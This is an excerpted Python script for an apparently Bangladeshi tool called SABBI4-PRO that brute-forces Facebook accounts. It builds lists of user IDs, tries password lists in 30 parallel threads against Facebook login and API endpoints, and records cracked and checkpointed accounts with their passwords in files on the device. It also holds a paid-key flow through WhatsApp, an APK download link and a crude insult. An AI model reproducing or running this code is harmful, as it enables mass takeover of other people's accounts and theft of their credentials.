...
----------------------------------------------
 ...
 Tool Name : SABBI4-PRO
 Type type : Free
 Version   : 1.9.8
----------------------------------------------
 SABBI4 Pro version 1.9.8
 For Haters: Tutul-King Ar Ma Re Raita Chudi🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SABBI4_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100000667784765/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801304683013&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi SABBI4 Sir, I Need To Buy Your Paid SABBI4 PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SABBI4.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SABBI4:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                SABBI4.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SABBI4-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SABBI4:
                                ...
                                print('\r\r\033[1;32m [SABBI4-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SABBI4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SABBI4:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SABBI4-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SABBI4-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SABBI4-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SABBI4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SABBI4-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SABBI4-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SABBI4-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SABBI4-OK] '+uid+' | '+pas+'\033[1;97m')
